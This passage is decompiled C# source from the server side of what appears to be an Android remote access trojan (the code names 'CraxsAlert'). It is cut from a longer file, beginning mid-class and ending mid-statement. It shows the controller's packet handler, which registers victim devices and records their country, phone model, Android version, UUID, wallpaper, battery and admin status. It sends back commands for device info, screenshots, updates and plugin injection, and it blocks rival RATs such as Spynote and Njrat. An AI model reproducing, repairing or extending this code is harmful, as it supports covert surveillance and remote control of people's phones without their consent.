		internal Exception _0024VB_0024ResumableLocal_ex_0024507;

		internal object[] _0024VB_0024ResumableLocal_objs_0024508;

		internal string[] _0024S509;

		internal int _0024S510;

		internal string _0024VB_0024ResumableLocal_name_0024511;

		internal Exception _0024VB_0024ResumableLocal_ex_0024512;

		internal Exception _0024VB_0024ResumableLocal_ex_0024513;

		internal string[] _0024VB_0024ResumableLocal_arryiconandkey_0024514;

		internal string _0024VB_0024ResumableLocal_state_0024515;

		internal string _0024VB_0024ResumableLocal_getPath_0024516;

		internal Image _0024VB_0024ResumableLocal_appicon_0024517;

		internal int _0024VB_0024ResumableLocal_id_0024518;

		internal Exception _0024VB_0024ResumableLocal_ex_0024519;

		internal Exception _0024VB_0024ResumableLocal_ex_0024520;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024521;

		internal string[] _0024VB_0024ResumableLocal_SPL_lines_0024522;

		internal string[] _0024VB_0024ResumableLocal_SPLArry_0024523;

		internal string _0024VB_0024ResumableLocal_handle_0024524;

		internal AppsProperties _0024VB_0024ResumableLocal_AppsProperties_0024525;

		internal Image _0024VB_0024ResumableLocal_image_0024526;

		internal Control _0024VB_0024ResumableLocal_c0_0024527;

		internal Control _0024VB_0024ResumableLocal_c1_0024528;

		internal Control _0024VB_0024ResumableLocal_c2_0024529;

		internal Control _0024VB_0024ResumableLocal_c3_0024530;

		internal Control _0024VB_0024ResumableLocal_c4_0024531;

		internal string[] _0024S532;

		internal int _0024S533;

		internal string _0024VB_0024ResumableLocal_Permissions_0024534;

		internal Label _0024VB_0024ResumableLocal_lab_0024535;

		internal Exception _0024VB_0024ResumableLocal_ex_0024536;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024537;

		internal string _0024VB_0024ResumableLocal_handle_0024538;

		internal ClipboardManager _0024VB_0024ResumableLocal_ClipboardManager_0024539;

		internal Exception _0024VB_0024ResumableLocal_ex_0024540;

		internal string[] _0024VB_0024ResumableLocal_SPL_0024541;

		internal object[] _0024VB_0024ResumableLocal_obj_Upd_0024542;

		internal Exception _0024VB_0024ResumableLocal_skip_0024543;

		internal Exception _0024VB_0024ResumableLocal_ex_0024544;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			checked
			{
				try
				{
					try
					{
						if (!MainForm.IsDisposed)
						{
							_0024VB_0024ResumableLocal__0024VB_0024Closure__00240 = new _Closure_0024__39_002D1(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240);
							_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient = (Client)NewLateBinding.LateIndexGet(_0024VB_0024Local_ParametersObject, new object[1] { 0 }, null);
							_0024VB_0024ResumableLocal_bByte_00241 = (byte[])NewLateBinding.LateIndexGet(_0024VB_0024Local_ParametersObject, new object[1] { 1 }, null);
							_0024VB_0024ResumableLocal_SizeData_00242 = (Array)NewLateBinding.LateIndexGet(_0024VB_0024Local_ParametersObject, new object[1] { 2 }, null);
							_0024VB_0024ResumableLocal_Client_00243 = (TcpClient)NewLateBinding.LateIndexGet(_0024VB_0024Local_ParametersObject, new object[1] { 3 }, null);
							_0024VB_0024ResumableLocal_thesizes_00244 = null;
							try
							{
								_0024VB_0024ResumableLocal_SPLByte_00245 = Codes.SplitByte(_0024VB_0024ResumableLocal_bByte_00241, _0024VB_0024ResumableLocal_SizeData_00242);
								_0024VB_0024ResumableLocal_EncodString_00246 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(0));
								_0024VB_0024ResumableLocal_getCase_00247 = (_0024VB_0024ResumableLocal_EncodString_00246.Contains(SPL_ARRAY) ? _0024VB_0024ResumableLocal_EncodString_00246.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None)[0] : _0024VB_0024ResumableLocal_EncodString_00246);
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex);
								Exception ex2 = ex;
								_0024VB_0024ResumableLocal_ex_00248 = ex2;
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CraxsAlert.ShowWarning("Known Rat Trying to Connect\r\n Spynote,Njrat,...,etc");
								}));
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Blockme(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
								LOGIT(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient, "Blocking Known Rat (Spynote,Njrat,....)", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Flag);
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
								ProjectData.ClearProjectError();
								goto end_IL_0008;
							}
							if (Operators.CompareString(_0024VB_0024ResumableLocal_getCase_00247.Trim(), "-0", TextCompare: false) == 0)
								_0024VB_0024ResumableLocal_getCase_00247 = "-255";
							if (_0024VB_0024ResumableLocal_getCase_00247.StartsWith("-9"))
							{
								_0024VB_0024ResumableLocal_thesizes_00244 = _0024VB_0024ResumableLocal_getCase_00247;
								_0024VB_0024ResumableLocal_getCase_00247 = "-9";
							}
							Console.WriteLine("case:" + _0024VB_0024ResumableLocal_getCase_00247);
							_0024S9 = _0024VB_0024ResumableLocal_getCase_00247.Trim();
							if (Operators.CompareString(_0024S9, "-A", TextCompare: false) == 0)
							{
								if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row != null)
								{
									_0024VB_0024ResumableLocal_THEDATA_002410 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
									if (!string.IsNullOrEmpty(_0024VB_0024ResumableLocal_THEDATA_002410))
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ActiveNow = _0024VB_0024ResumableLocal_THEDATA_002410;
										MainForm.Logalert(new object[2]
										{
											Codes.ResizeImage(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Wallpaper, new Size(45, 45)),
											_0024VB_0024ResumableLocal_THEDATA_002410
										});
									}
								}
							}
							else if (Operators.CompareString(_0024S9, Conversions.ToString(reso.plug.Count), TextCompare: false) == 0)
							{
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.IsReal = true;
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
								LOGIT(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient, "Connecting..", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Flag);
								_0024VB_0024ResumableLocal_getKey_002411 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys.Split(':');
								_0024VB_0024ResumableLocal_obj_002412 = new object[4]
								{
									_0024VB_0024ResumableLocal_Client_00243,
									SecurityKey.KeysClient1 + SPL_SOCKET + reso.domen + ".info" + SPL_SOCKET + "method" + SPL_SOCKET + SecurityKey.getinfo + SPL_SOCKET + "info" + SPL_DATA + _0024VB_0024ResumableLocal_getKey_002411[2] + SPL_DATA + _0024VB_0024ResumableLocal_getKey_002411[5],
									Codes.Encoding().GetBytes("null"),
									_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
								};
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_obj_002412);
							}
							else if (Operators.CompareString(_0024S9, "-255", TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.IsReal = true;
									if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient != null)
									{
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row != null)
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.mydatestart = DateTime.Now.AddSeconds(45.0);
										_0024VB_0024ResumableLocal_response_002413 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										_0024VB_0024ResumableLocal_DataStatistics_002414 = "";
										try
										{
											if (_0024VB_0024ResumableLocal_response_002413.Contains("<!>"))
											{
												_0024VB_0024ResumableLocal_newDataStatic_002415 = _0024VB_0024ResumableLocal_response_002413.Split('<');
												if (_0024VB_0024ResumableLocal_newDataStatic_002415[1].EndsWith("1"))
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.IsAdminActive = true;
												else
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.IsAdminActive = false;
												_0024VB_0024ResumableLocal_DataStatistics_002414 = _0024VB_0024ResumableLocal_newDataStatic_002415[0];
											}
											else
												_0024VB_0024ResumableLocal_DataStatistics_002414 = _0024VB_0024ResumableLocal_response_002413;
										}
										catch (Exception ex3)
										{
											ProjectData.SetProjectError(ex3);
											Exception ex4 = ex3;
											_0024VB_0024ResumableLocal_ex_002416 = ex4;
											_0024VB_0024ResumableLocal_DataStatistics_002414 = _0024VB_0024ResumableLocal_response_002413;
											ProjectData.ClearProjectError();
										}
										_0024VB_0024ResumableLocal_SCREEN_002417 = Operators.CompareString(_0024VB_0024ResumableLocal_DataStatistics_002414, "25", TextCompare: false) == 0;
										if (!_0024VB_0024ResumableLocal_SCREEN_002417)
										{
											if ((_0024VB_0024ResumableLocal_DataStatistics_002414.Trim().Length == 0) & (_0024VB_0024ResumableLocal_DataStatistics_002414.Length == 1))
											{
												_0024VB_0024ResumableLocal_Obj_002418 = new object[4]
												{
													_0024VB_0024ResumableLocal_Client_00243,
													SecurityKey.SHOT,
													Codes.Encoding().GetBytes(SecurityKey.SHOT),
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
												};
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_Obj_002418);
											}
											else if (_0024VB_0024ResumableLocal_DataStatistics_002414.Length > 1)
											{
												_0024VB_0024ResumableLocal_ar_002419 = Codes.GetStatistics(_0024VB_0024ResumableLocal_DataStatistics_002414);
												if ((_0024VB_0024ResumableLocal_ar_002419[0].Length != 0) & (_0024VB_0024ResumableLocal_ar_002419[1].Length != 0))
												{
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Statistics = $"{_0024VB_0024ResumableLocal_ar_002419[0]} ms";
													MainForm.updaterows(new object[2]
													{
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient,
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row
													});
												}
											}
										}
										if (_0024VB_0024ResumableLocal_SCREEN_002417)
										{
											_0024VB_0024ResumableLocal_obj_Upd_002420 = new object[4]
											{
												_0024VB_0024ResumableLocal_Client_00243,
												SecurityKey.KeysClient1 + SPL_SOCKET + reso.domen + ".info" + SPL_SOCKET + "method" + SPL_SOCKET + SecurityKey.getUpdate + SPL_SOCKET + "update",
												Codes.Encoding().GetBytes("null"),
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
											};
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_obj_Upd_002420);
										}
										if ((_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row == null) | !MainForm.ClientsWindow.Rows.Contains(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row))
										{
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CountPoing == -5)
											{
												try
												{
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
													_0024VB_0024ResumableLocal_getKey_002421 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys.Split(':');
													_0024VB_0024ResumableLocal_obj_002422 = new object[4]
													{
														_0024VB_0024ResumableLocal_Client_00243,
														SecurityKey.KeysClient1 + SPL_SOCKET + reso.domen + ".info" + SPL_SOCKET + "method" + SPL_SOCKET + SecurityKey.getinfo + SPL_SOCKET + "info" + SPL_DATA + _0024VB_0024ResumableLocal_getKey_002421[2] + SPL_DATA + _0024VB_0024ResumableLocal_getKey_002421[5],
														Codes.Encoding().GetBytes("null"),
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
													};
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_obj_002422);
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CountPoing = 0;
												}
												catch (Exception ex5)
												{
													ProjectData.SetProjectError(ex5);
													Exception ex6 = ex5;
													_0024VB_0024ResumableLocal_ex_002423 = ex6;
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Close(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient);
													ProjectData.ClearProjectError();
												}
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CountPoing = 0;
											}
											else if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CountPoing >= 2)
											{
												_0024VB_0024ResumableLocal_objFix_002424 = new object[4]
												{
													_0024VB_0024ResumableLocal_Client_00243,
													SecurityKey.KeysClient11 + SPL_SOCKET + "null",
													Codes.Encoding().GetBytes("null"),
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
												};
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_objFix_002424);
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CountPoing = -5;
											}
											else
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CountPoing = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CountPoing + 1;
											}
										}
										else
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CountPoing = 0;
									}
								}
								catch (Exception ex7)
								{
									ProjectData.SetProjectError(ex7);
									Exception ex8 = ex7;
									_0024VB_0024ResumableLocal_ex_002425 = ex8;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "-1", TextCompare: false) == 0)
							{
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.IsReal = true;
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
								_0024VB_0024ResumableLocal_injection_002426 = SPL_SOCKET + SecurityKey.KeysClient1 + SPL_SOCKET + SecurityKey.KeysClient2 + SPL_SOCKET + SecurityKey.KeysClient3 + SPL_SOCKET + SecurityKey.KeysClient4 + SPL_SOCKET + SecurityKey.KeysClient5 + SPL_SOCKET + SecurityKey.KeysClient6 + SPL_SOCKET + SecurityKey.KeysClient7 + SPL_SOCKET + SecurityKey.KeysClient8 + SPL_SOCKET + SecurityKey.KeysClient9 + SPL_SOCKET + SecurityKey.KeysClient10 + SPL_SOCKET + SecurityKey.KeysClient11 + SPL_SOCKET + SecurityKey.KeysGetClient + SPL_SOCKET + SecurityKey.resultClient;
								if (reso.plug.Count > 0)
									try
									{
										_0024S27 = reso.plug.GetEnumerator();
										while (_0024S27.MoveNext())
										{
											_0024VB_0024ResumableLocal_pl_002428 = RuntimeHelpers.GetObjectValue(_0024S27.Current);
											_0024VB_0024ResumableLocal_plg_002429 = (Array)_0024VB_0024ResumableLocal_pl_002428;
											_0024VB_0024ResumableLocal_obj_002430 = new object[5]
											{
												_0024VB_0024ResumableLocal_Client_00243,
												Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("0" + SPL_SOCKET, NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_plg_002429, new object[1] { 0 }, null)), SPL_SOCKET), NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_plg_002429, new object[1] { 1 }, null)), SPL_SOCKET), NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_plg_002429, new object[1] { 2 }, null)), SPL_SOCKET), NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_plg_002429, new object[1] { 3 }, null)), SPL_SOCKET), NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_plg_002429, new object[1] { 5 }, null)), _0024VB_0024ResumableLocal_injection_002426),
												NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_plg_002429, new object[1] { 4 }, null),
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient,
												true
											};
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_obj_002430);
										}
									}
									finally
									{
										if (num < 0)
											((IDisposable)_0024S27).Dispose();
									}
							}
							else if (Operators.CompareString(_0024S9, SecurityKey.KeysGetClient, TextCompare: false) == 0)
							{
								_0024VB_0024ResumableLocal_getKey_002431 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys.Split(':');
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.IsReal = true;
								_0024VB_0024ResumableLocal_obj_002432 = new object[4]
								{
									_0024VB_0024ResumableLocal_Client_00243,
									SecurityKey.KeysClient1 + SPL_SOCKET + reso.domen + ".info" + SPL_SOCKET + "method" + SPL_SOCKET + SecurityKey.getinfo + SPL_SOCKET + "info" + SPL_DATA + _0024VB_0024ResumableLocal_getKey_002431[2] + SPL_DATA + _0024VB_0024ResumableLocal_getKey_002431[5],
									Codes.Encoding().GetBytes("null"),
									_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
								};
								LOGIT(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient, "New Keys..", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Flag);
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_obj_002432);
							}
							else if (Operators.CompareString(_0024S9, SecurityKey.getinfo, TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433 = new _Closure_0024__39_002D0(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433);
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;
									if (_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Row != null)
										Console.WriteLine("New Client:Available");
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
									_0024VB_0024ResumableLocal_getKEY_002434 = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Keys.Split(':');
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Flag = (Bitmap)GetFlagThisIp.ThisIp(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientAddressIP);
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Country = GetCountryName2.GetCountryName(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientAddressIP);
									try
									{
										if (Operators.CompareString(_0024VB_0024ResumableLocal_getKEY_002434[9], "V4", TextCompare: false) == 0)
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Isv4 = true;
									}
									catch (Exception ex9)
									{
										ProjectData.SetProjectError(ex9);
										Exception ex10 = ex9;
										_0024VB_0024ResumableLocal_ex_002435 = ex10;
										ProjectData.ClearProjectError();
									}
									_0024VB_0024ResumableLocal_identifiers_002436 = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[5].Split('|');
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.VersionClient = reso.GetVersionClient(_0024VB_0024ResumableLocal_getKEY_002434);
									try
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientName = _0024VB_0024ResumableLocal_identifiers_002436[0];
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.UUID = _0024VB_0024ResumableLocal_identifiers_002436[1];
									}
									catch (Exception ex11)
									{
										ProjectData.SetProjectError(ex11);
										Exception ex12 = ex11;
										_0024VB_0024ResumableLocal_ex_002437 = ex12;
										if (_0024VB_0024ResumableLocal_identifiers_002436[0].ToString().ToLower().Contains("ev-"))
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientName = _0024VB_0024ResumableLocal_identifiers_002436[0];
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.UUID = _0024VB_0024ResumableLocal_identifiers_002436[0].Replace("ev-", "");
										}
										else
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientName = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[5];
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.UUID = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[6];
										}
										ProjectData.ClearProjectError();
									}
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientRemoteAddress = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.UUID;
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.android = "";
									if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[3], "Android 10 10", TextCompare: false) == 0)
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.android = "Android 10";
									else if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[3], "Android 11 11", TextCompare: false) == 0)
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.android = "Android 11";
									}
									else if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[3], "12", TextCompare: false) == 0)
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.android = "Android 12";
									}
									else
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.android = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[3];
									}
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Phone_model = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[1];
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.FolderUSER = Dir(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientName + "-" + _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.UUID);
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.host = _0024VB_0024ResumableLocal_getKEY_002434[6];
									MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										try
										{
											if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[8].ToString(), "-1", TextCompare: false) != 0)
												_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wallpaper = reso.Wallpaper(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[8], 48, 48, _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient);
										}
										catch (Exception projectError4)
										{
											ProjectData.SetProjectError(projectError4);
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wallpaper = (Bitmap)Codes.BlankImage();
											ProjectData.ClearProjectError();
										}
										try
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
										}
										catch (Exception projectError5)
										{
											ProjectData.SetProjectError(projectError5);
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
											ProjectData.ClearProjectError();
										}
									}));
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Screen = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[9];
									if (_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[10] != null)
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.BatteryCharge = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[10];
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.BatteryCharge.EndsWith("t"))
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.BatteryCharge = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.BatteryCharge.Replace("t", "").Replace("f", "");
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Battery = "-1";
										}
										else
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.BatteryCharge = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.BatteryCharge.Replace("f", "").Replace("t", "");
